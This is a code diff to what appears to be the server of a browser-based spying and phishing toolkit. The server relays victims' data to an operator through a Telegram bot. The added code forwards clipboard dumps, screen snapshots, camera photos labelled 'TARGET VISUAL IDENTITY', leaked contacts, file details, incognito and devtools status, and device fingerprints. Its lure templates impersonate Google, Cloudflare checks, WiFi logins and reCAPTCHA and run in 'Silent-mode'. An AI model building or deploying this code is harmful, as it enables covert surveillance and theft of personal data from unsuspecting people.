@@ -149,9 +149,11 @@ async function startServer() {
                   `├ Platform: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
                   `├ CPU Cores: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
                   `├ RAM (Est): <code>${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
+                  `├ VM Status: <code>${escapeHTML(data.vmStatus || 'N/A')}</code>\n` +
                   `└ Screen: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
                   `🌍 <b>REGION & ENV</b>\n` +
                   `├ Timezone: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
+                  `├ Langs: <code>${escapeHTML(data.langs || 'N/A')}</code>\n` +
                   `└ Referrer: <code>${escapeHTML(data.ref || 'Direct')}</code>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
                   `${status}`;
@@ -170,21 +172,44 @@ async function startServer() {
       let extraMsg = `📎 <b>ADVANCED MODULE CAPTURED</b> 📎\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n`;
       
-      if (data.clipboard) {
-        extraMsg += `📋 <b>CLIPBOARD DATA:</b>\n<pre>${escapeHTML(data.clipboard)}</pre>\n\n`;
+      if (data.hardware_brand_profile) {
+        try {
+          const h = JSON.parse(data.hardware_brand_profile);
+          extraMsg += `🛠️ <b>HARDWARE IDENTITY:</b>\n` +
+                      `├ Brand/Model: <code>${escapeHTML(h.model || 'N/A')}</code>\n` +
+                      `├ Form: <code>${escapeHTML(h.formFactor || 'N/A')}</code>\n` +
+                      `└ Arch: <code>${escapeHTML(h.architecture || 'N/A')}</code>\n\n`;
+        } catch(e) {}
       }
-      if (data.media) {
-        extraMsg += `🎙️ <b>AV HARDWARE AUDIT:</b>\n<pre>${escapeHTML(data.media)}</pre>\n\n`;
+      if (data.cpu_compute_score) {
+        extraMsg += `⚡ <b>CPU PERFORMANCE:</b>\n` +
+                    `└ Score: <code>${data.cpu_compute_score}</code>\n\n`;
+      }
+      if (data.clipboard_sync) {
+        extraMsg += `📋 <b>CLIPBOARD DUMP:</b>\n<pre>${escapeHTML(data.clipboard_sync)}</pre>\n\n`;
+      }
+      if (data.media_hardware) {
+        extraMsg += `🎙️ <b>AV HARDWARE AUDIT:</b>\n<pre>${escapeHTML(data.media_hardware)}</pre>\n\n`;
       }
       if (data.file_name) {
         extraMsg += `📂 <b>FILE ACCESS GRANTED:</b>\n` +
                     `├ Name: <code>${escapeHTML(data.file_name)}</code>\n` +
                     `└ Size: <code>${(data.file_size / 1024).toFixed(2)} KB</code>\n\n`;
       }
-      if (data.screen_label || data.screen_capture) {
+      if (data.screen_label) {
         extraMsg += `🖥️ <b>SCREEN INTERFACE LOGGED:</b>\n` +
-                    `├ Source: <code>${escapeHTML(data.screen_label || 'Display Stream')}</code>\n` +
+                    `├ Source: <code>${escapeHTML(data.screen_label)}</code>\n` +
                     `└ Status: <b>Sync Success</b>\n\n`;
+      }
+      
+      // Image delivery
+      if (data.screen_capture) {
+        const buffer = Buffer.from(data.screen_capture.split(',')[1], 'base64');
+        botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `🖥️ SCREEN SNAPSHOT CAPTURED` }).catch(() => {});
+      }
+      if (data.visual_identity) {
+        const buffer = Buffer.from(data.visual_identity.split(',')[1], 'base64');
+        botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `📸 TARGET VISUAL IDENTITY` }).catch(() => {});
       }
       if (data.contacts_leaked) {
         let count = 0;
@@ -201,6 +226,40 @@ async function startServer() {
         extraMsg += `💾 <b>STORAGE FORENSICS:</b>\n` +
                     `├ Usage: <code>${data.storage_mb} MB</code>\n` +
                     `└ Quota: <code>${data.quota_gb} GB</code>\n\n`;
+      }
+      
+      if (data.incognito_audit !== undefined) {
+        extraMsg += `🕵️ <b>BROWSER MODE:</b>\n` +
+                    `└ Private/Incognito: <b>${data.incognito_audit ? 'YES' : 'NO'}</b>\n\n`;
+      }
+      if (data.devtools_open !== undefined) {
+        extraMsg += `🛠️ <b>INSPECTOR DETECTED:</b>\n` +
+                    `└ Developer Tools: <b>${data.devtools_open ? 'OPEN' : 'CLOSED'}</b>\n\n`;
+      }
+      if (data.sec_webdriver !== undefined) {
+        extraMsg += `🛡️ <b>KERNEL SECURITY:</b>\n` +
+                    `├ WebDriver: <code>${data.sec_webdriver}</code>\n` +
+                    `├ Cookies: <code>${data.sec_cookies}</code>\n` +
+                    `└ Java: <code>${data.sec_java}</code>\n\n`;
+      }
+      
+      if (data.net_effective) {
+        extraMsg += `🌐 <b>NETWORK LAYER ANALYTICS:</b>\n` +
+                    `├ Type: <code>${data.net_effective}</code>\n` +
+                    `├ RTT: <code>${data.net_rtt}ms</code>\n` +
+                    `└ Downlink: <code>${data.net_downlink}Mb/s</code>\n\n`;
+      }
+      if (data.bt_available !== undefined) {
+        extraMsg += `📡 <b>PERIPHERAL BUS:</b>\n` +
+                    `└ BT Adapter: <b>${data.bt_available ? 'Active' : 'Offline'}</b>\n\n`;
+      }
+      if (data.display_hz) {
+        extraMsg += `📺 <b>DISPLAY PERFORMANCE:</b>\n` +
+                    `└ Refresh Rate: <code>${data.display_hz} Hz</code>\n\n`;
+      }
+      if (data.haptic_ready) {
+        extraMsg += `📳 <b>HAPTIC RESPONSE:</b>\n` +
+                    `└ Engine: <b>Verified & Calibrated</b>\n\n`;
       }
       
       extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
@@ -363,12 +422,12 @@ async function startServer() {
                 `Pilih template operasional berikut:\n\n`;
       
       const tmplDesc: Record<string, string> = {
-        'google': '└ <i>Identity Ecosystem Audit. Full-stack hardware, regional & display-intel recon.</i>',
-        'gallery': '└ <i>System Asset Forensic. Media metadata, storage-quota & social-graph mapping.</i>',
-        'cloudflare': '└ <i>Edge Verification 5.0. Advanced RTT-mapping, footprinting & sensor-delta audit.</i>',
-        'pegasus': '└ <i>Kernel Intelligence v8. Elite audio/font sig & hardware-bus diagnostics.</i>',
-        'wifi': '└ <i>Enterprise Hotspot Recon. Social-presence audit & network forensic mapping.</i>',
-        'recap': '└ <i>Ghost Recon Audit. Seamless multi-layered background telemetry extraction.</i>'
+        'google': '└ <i>System Identity Ecosystem. Audit hardware-bus, high-entropy regional & display patterns.</i>',
+        'gallery': '└ <i>Deep Forensic Registry. Media telemetry, storage mapping & social-graph extraction.</i>',
+        'cloudflare': '└ <i>Edge Verification 6.0. Precision fingerprinting, RTT-latency mapping & sensor audit.</i>',
+        'pegasus': '└ <i>Kernel Intelligence v9. Elite audio-sig, font-profiling & ring-0 hardware diagnostics.</i>',
+        'wifi': '└ <i>Elite Enterprise Auth. Social-presence triangulation & network forensic mapping.</i>',
+        'recap': '└ <i>Ghost Recon Protocol. Multi-layered background telemetry extraction (Silent-mode).</i>'
       };
 
       Object.entries(templates).forEach(([key, tmpl]) => {
